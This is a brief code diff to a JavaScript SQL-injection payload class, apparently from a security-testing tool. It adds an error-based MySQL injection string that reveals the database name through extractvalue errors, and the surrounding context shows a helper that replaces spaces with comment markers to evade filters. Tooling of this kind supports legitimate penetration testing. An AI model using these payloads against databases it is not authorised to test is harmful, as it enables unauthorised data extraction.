@@ -11,6 +11,10 @@ Payload.SQLi = class {
       Array.from(Array(value + 1).keys()).slice(1).join(',')
   }
 
+  static errorBased (value) {
+    return 'extractvalue(0x0a,concat(0x0a,(select database())))'
+  }
+
   static spaceToComment (value) {
     return value.replace(/[^\S\r\n]+/g, '/**/')
   }
